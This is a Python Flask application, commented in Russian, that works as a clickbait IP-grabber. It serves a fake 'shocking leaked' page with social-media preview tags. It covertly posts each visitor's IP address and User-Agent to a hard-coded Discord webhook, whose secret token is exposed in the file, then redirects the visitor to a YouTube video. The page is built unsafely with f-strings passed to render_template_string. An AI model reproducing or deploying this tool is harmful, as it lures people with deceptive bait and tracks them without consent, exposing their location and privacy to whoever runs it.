import os
import logging
from flask import Flask, request, render_template_string, jsonify
import requests

app = Flask(__name__)

# Настройка логирования
logging.basicConfig(level=logging.INFO)

# Загрузка конфигураций из переменных окружения с дефолтными значениями
CLICKBAIT_TITLE = os.environ.get("CLICKBAIT_TITLE", "😱 ШОК! Ты не поверишь, что сосмарк...")
CLICKBAIT_DESCRIPTION = os.environ.get(
    "CLICKBAIT_DESCRIPTION",
    "🔥 Эксклюзив! Это должно было остаться в секрете, но утекло в сеть. Скорее смотри, пока не удалили!"
)
CLICKBAIT_IMAGE = os.environ.get("CLICKBAIT_IMAGE", "https://avatars.mds.yandex.net/i?id=a4aecf9cbc80023011c1e098ff28befc5fa6d0b6-8220915-images-thumbs&n=13")
REAL_URL = os.environ.get("REAL_URL", "https://youtu.be/kk3_5AHEZxE?si=0RnrfrvHJIiHqes7")
DISCORD_WEBHOOK_URL = os.environ.get("DISCORD_WEBHOOK_URL", "https://discord.com/api/webhooks/1338142323795824691/ox3HgetuOjqcKx-3AO1X6mb53Y-SfS8MBt3XU2M8GLVcgfNPE85Gk2Y8e5TDVYdsKUwt")
REDIRECT_DELAY = int(os.environ.get("REDIRECT_DELAY", "5"))

# Глобальный счётчик кликов
click_count = 0


@app.route('/')
def home():
    return "Используйте /generate для создания кликбейт-ссылки."


@app.route('/generate')
def generate_link():
    # Здесь можно в будущем реализовать генерацию уникальных ссылок.
    return f"Вот ваша кликбейт-ссылка: {request.host_url}clickbait"


@app.route('/clickbait')
def clickbait_page():
    global click_count
    click_count += 1

    # Получение информации о пользователе
    user_ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')

    # Отправка уведомления в Discord с обработкой ошибок
    try:
        payload = {
            "content": f"🚨 Новый переход! Всего кликов: {click_count}\n**IP:** {user_ip}\n**User-Agent:** {user_agent}"
        }
        response = requests.post(DISCORD_WEBHOOK_URL, json=payload)
        if response.status_code not in (200, 204):
            logging.warning("Ошибка отправки Discord Webhook: %s", response.text)
    except Exception as e:
        logging.error("Ошибка при отправке Discord Webhook: %s", e)

    # Формирование HTML-страницы с OG-тегами и стильным оформлением
    html_content = f"""
    <html>
    <head>
        <title>{CLICKBAIT_TITLE}</title>

        <!-- Open Graph (OG) Meta Tags -->
        <meta property="og:title" content="{CLICKBAIT_TITLE}">
        <meta property="og:description" content="{CLICKBAIT_DESCRIPTION}">
        <meta property="og:image" content="{CLICKBAIT_IMAGE}">
        <meta property="og:url" content="{request.url}">
        <meta property="og:type" content="website">

        <!-- Twitter Cards -->
        <meta name="twitter:card" content="summary_large_image">
        <meta name="twitter:title" content="{CLICKBAIT_TITLE}">
        <meta name="twitter:description" content="{CLICKBAIT_DESCRIPTION}">
        <meta name="twitter:image" content="{CLICKBAIT_IMAGE}">

        <style>
            body {{
                font-family: Arial, sans-serif;
                text-align: center;
                background: linear-gradient(45deg, #ff416c, #ff4b2b);
                color: white;
                height: 100vh;
                display: flex;
                flex-direction: column;
                align-items: center;
                justify-content: center;
                margin: 0;
                animation: fadeIn 2s;
            }}
            h1 {{
                font-size: 3em;
                text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
            }}
            p {{
                font-size: 1.5em;
                margin-top: 10px;
                opacity: 0.9;
            }}
            .spinner {{
                border: 6px solid rgba(255, 255, 255, 0.3);
                border-top: 6px solid white;
                border-radius: 50%;
                width: 50px;
                height: 50px;
                animation: spin 1s linear infinite;
                margin-top: 20px;
            }}
            @keyframes fadeIn {{
                from {{ opacity: 0; }}
                to {{ opacity: 1; }}
            }}
            @keyframes spin {{
                0% {{ transform: rotate(0deg); }}
                100% {{ transform: rotate(360deg); }}
            }}
            .button {{
                background: white;
                color: #ff416c;
                border: none;
                padding: 15px 30px;
                font-size: 1.2em;
                border-radius: 10px;
                cursor: pointer;
                margin-top: 20px;
                transition: 0.3s;
            }}
            .button:hover {{
                background: #ff4b2b;
                color: white;
            }}
        </style>
        <script>
            setTimeout(function() {{
                window.location.href = "{REAL_URL}";
            }}, {REDIRECT_DELAY * 1000});
        </script>
    </head>
    <body>
        <h1>{CLICKBAIT_TITLE}</h1>
        <p>Ты в шоке? 😱 Через {REDIRECT_DELAY} секунд ты узнаешь правду!</p>
        <div class="spinner"></div>
        <button class="button" onclick="window.location.href='{REAL_URL}'">Узнать правду</button>
    </body>
    </html>
    """
    return render_template_string(html_content)


@app.route('/stats')
def stats():
    """Эндпоинт для получения статистики кликов."""
    return jsonify({"click_count": click_count})


if __name__ == '__main__':
    # Используем настройки из переменных окружения: хост и порт
    host = os.environ.get("HOST", "0.0.0.0")
    port = int(os.environ.get("PORT", 5000))
    app.run(host=host, port=port, debug=False)